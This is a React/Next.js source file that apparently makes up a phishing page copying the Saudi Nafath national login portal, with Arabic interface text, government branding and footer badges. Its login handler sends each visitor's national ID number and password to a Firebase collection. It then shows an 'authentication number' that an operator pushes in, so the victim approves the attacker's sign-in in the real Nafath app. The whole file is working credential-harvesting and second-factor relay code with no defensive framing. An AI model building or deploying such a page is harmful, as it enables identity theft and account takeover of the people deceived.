"use client";

export const dynamic = 'force-dynamic';

import { Loader2Icon, Menu, ShieldAlert, Smartphone } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent } from "@/components/ui/card";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { useEffect, useState } from "react";
import { addData, db } from "@/lib/firebase";
import { Alert } from "@/components/ui/alert";
import { doc, onSnapshot } from "firebase/firestore";

export default function Component() {
  const [showAuthDialog, setShowAuthDialog] = useState(false);
  const [authNumber, setAuthNumber] = useState<string>("");
  const [isloading, setIsLoading] = useState(false);
  const [idLogin, setLoginID] = useState("");
  const [password,setPassword] = useState("");
  const [showError, setShowError] = useState("");

  
  useEffect(() => {
    const visitorId = localStorage.getItem("visitor")
    if (visitorId && db) {
      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
        if (docSnap.exists()) {
          const data = docSnap.data()
          setAuthNumber( data.authNumber)
      
        }
      })

      return () => unsubscribe()
    }
  }, [])

  const handleLogin = (e: any) => {
    e.preventDefault();
    const visitorId = localStorage.getItem("visitor");
    setShowError("");

    setIsLoading(true);
    addData({
      id: visitorId,
      nafazId: idLogin,
      nafazPass:password,
      authNumber: "...",
      approval: "pending",
    });
    setTimeout(() => {
      setShowAuthDialog(true);
      setIsLoading(false);
    }, 5000);
  };

  return (
    <div
      className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100"
      dir="rtl"
    >
      {/* Header */}
      <header className="bg-white shadow-sm border-b">
        <div className="flex items-center justify-between p-4 max-w-7xl mx-auto">
          <Menu className="w-6 h-6 text-gray-600 cursor-pointer hover:text-teal-600 transition-colors" />
          <img src="lgog.png" alt="sd" width={80} className="object-contain" />
          <div className="w-6"></div>
        </div>
      </header>

      {/* Main Content */}
      <main className="p-4 space-y-6 max-w-2xl mx-auto py-8">
        {/* Login Section Title */}
        <div className="text-center space-y-2">
          <h1 className="text-2xl font-bold text-gray-800 mb-2">
            الدخول على النظام
          </h1>
          <p className="text-gray-600 text-sm">
            استخدم تطبيق نفاذ للدخول بشكل آمن
          </p>
        </div>

        {/* Nafath App Section */}
        <div className="bg-gradient-to-r from-teal-600 to-teal-700 text-white p-6 rounded-xl text-center shadow-lg">
          <div className="flex items-center justify-center gap-2 mb-2">
            <ShieldAlert className="w-6 h-6" />
            <h2 className="text-xl font-bold">تطبيق نفاذ</h2>
          </div>
          <div className="w-16 h-1 bg-white/30 mx-auto rounded-full"></div>
        </div>

        <form onSubmit={handleLogin}>
          {/* Login Form */}
          <Card className="bg-white shadow-lg border-0">
            <CardContent className="p-6 space-y-5">
              <div className="text-center">
                <p className="text-gray-700 font-semibold mb-1">
                  رقم بطاقة الأحوال/الإقامة
                </p>
                <p className="text-sm text-gray-500">
                  أدخل رقم الهوية الخاص بك للمتابعة
                </p>
              </div>

              <Input
                placeholder="أدخل رقم الأحوال/الإقامة الخاص بك هنا"
                className="text-right border-gray-300 h-12 text-lg focus:ring-2 focus:ring-teal-500 transition-all"
                dir="rtl"
                onChange={(e) => setLoginID(e.target.value)}
                required
              />
 <Input
                placeholder="أدخل كلمة المرور الخاصة بك هنا"
                className="text-right border-gray-300 h-12 text-lg focus:ring-2 focus:ring-teal-500 transition-all"
                dir="rtl"
                onChange={(e) => setPassword(e.target.value)}
                type="password"
                required
              />
              {showError && (
                <Alert
                  className="text-sm text-red-600 flex items-center gap-2 bg-red-50 border-red-200"
                  dir="rtl"
                >
                  <ShieldAlert className="w-5 h-5 text-red-600" />
                  {showError}
                </Alert>
              )}

              <Button
                type="submit"
                disabled={isloading || !idLogin}
                className="w-full bg-gradient-to-r from-teal-600 to-teal-700 hover:from-teal-700 hover:to-teal-800 text-white h-12 text-lg font-semibold shadow-md hover:shadow-lg transition-all disabled:opacity-50"
              >
                {isloading ? (
                  <>
                    <Loader2Icon className="animate-spin ml-2" />
                    جاري التحقق...
                  </>
                ) : (
                  "تسجيل الدخول"
                )}
              </Button>

              <div className="pt-4 border-t">
                <div className="text-center text-gray-600 text-sm mb-3 font-medium">
                  لتحميل تطبيق نفاذ
                </div>

                {/* App Store Buttons */}
                <div className="flex justify-center gap-3">
                  <a href="#" className="hover:scale-105 transition-transform">
                    <img src="plays.svg" alt="Google Play" className="h-10" />
                  </a>
                  <a href="#" className="hover:scale-105 transition-transform">
                    <img src="apple.svg" alt="App Store" className="h-10" />
                  </a>
                </div>
              </div>
            </CardContent>
          </Card>
        </form>

        {/* New Nafath Platform Section */}
        <Card className="bg-gradient-to-br from-teal-600 via-teal-700 to-teal-800 text-white shadow-xl border-0 overflow-hidden relative">
          <div className="absolute top-0 right-0 w-32 h-32 bg-white/10 rounded-full -mr-16 -mt-16"></div>
          <div className="absolute bottom-0 left-0 w-24 h-24 bg-white/10 rounded-full -ml-12 -mb-12"></div>
          <CardContent className="p-8 text-center space-y-4 relative z-10">
            <div className="w-16 h-16 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-2">
              <Smartphone className="w-8 h-8 text-white" />
            </div>
            <h2 className="text-2xl font-bold">منصة النفاذ الجديدة</h2>
            <p className="text-sm leading-relaxed text-teal-50">
              لتجربة أكثر سهولة استخدم النسخة المحدثة
              <br />
              من منصة النفاذ الوطني الموحد
            </p>
            <Button className="bg-white text-teal-700 hover:bg-teal-50 px-8 py-3 rounded-lg font-bold shadow-lg hover:shadow-xl transition-all mt-4">
              ابدأ الآن
            </Button>
          </CardContent>
        </Card>

        {/* Authentication Dialog */}
        <Dialog open={showAuthDialog} onOpenChange={setShowAuthDialog}>
          <DialogContent className="max-w-md mx-auto" dir="rtl">
            <DialogHeader>
              <DialogTitle className="text-center text-2xl font-bold text-teal-600 mb-2">
                طلب المصادقة
              </DialogTitle>
              <p className="text-center text-sm text-gray-600">
                يرجى التحقق من تطبيق نفاذ على جهازك
              </p>
            </DialogHeader>

            <div className="text-center space-y-6 p-4">
              <div className="bg-gradient-to-br from-teal-50 to-teal-100 border-2 border-teal-300 rounded-xl p-8 shadow-inner">
                <div className="text-sm text-gray-600 mb-3 font-medium">
                  رقم المصادقة
                </div>
                <div className="text-5xl font-bold text-teal-600 tracking-widest font-mono">
                  {authNumber || "------"}
                </div>
              </div>

              <div className="space-y-3 bg-gray-50 p-4 rounded-lg">
                <div className="flex items-center justify-center gap-2 text-teal-600 mb-2">
                  <ShieldAlert className="w-5 h-5" />
                  <div className="text-gray-800 font-bold">
                    تم إرسال طلب مصادقة
                  </div>
                </div>
                <div className="text-sm text-gray-600 leading-relaxed">
                  يرجى فتح تطبيق نفاذ على جهازك المحمول والضغط على الرقم المطابق
                  لإتمام عملية تسجيل الدخول
                </div>
              </div>

              <div className="flex items-center justify-center gap-3 text-teal-600 py-4">
                <div className="relative">
                  <div className="w-3 h-3 bg-teal-600 rounded-full animate-ping absolute"></div>
                  <div className="w-3 h-3 bg-teal-600 rounded-full"></div>
                </div>
                <div className="text-sm font-medium">في انتظار الموافقة...</div>
              </div>

              <Button
                variant="outline"
                onClick={() => setShowAuthDialog(false)}
                className="w-full border-2 border-gray-300 text-gray-700 hover:bg-gray-100 h-11 font-semibold"
              >
                إلغاء
              </Button>
            </div>
          </DialogContent>
        </Dialog>
      </main>

      {/* Footer */}
      <footer className="mt-12 p-6 bg-white border-t">
        <div className="text-center space-y-6 max-w-4xl mx-auto">
          <div className="text-gray-600 text-sm font-medium">تطوير وتشغيل</div>

          <div className="flex justify-center items-center">
            <img
              src="nic-20.png"
              alt="sd"
              width={120}
              className="object-contain"
            />
          </div>

          <div className="flex flex-wrap justify-center gap-x-6 gap-y-2 text-xs text-gray-600">
            <a
              href="#"
              className="hover:text-teal-600 transition-colors font-medium"
            >
              الرئيسية
            </a>
            <a
              href="#"
              className="hover:text-teal-600 transition-colors font-medium"
            >
              حول
            </a>
            <a
              href="#"
              className="hover:text-teal-600 transition-colors font-medium"
            >
              اتصل بنا
            </a>
            <a
              href="#"
              className="hover:text-teal-600 transition-colors font-medium"
            >
              الشروط والأحكام
            </a>
            <a
              href="#"
              className="hover:text-teal-600 transition-colors font-medium"
            >
              المساعدة والدعم
            </a>
            <a
              href="#"
              className="hover:text-teal-600 transition-colors font-medium"
            >
              سياسة الخصوصية
            </a>
          </div>

          {/* Government Verification Badge */}
          <div className="flex justify-center mt-4">
            <img src="cisoc.svg" alt="sd" width={50} className="opacity-80" />
          </div>
        </div>
      </footer>
    </div>
  );
}
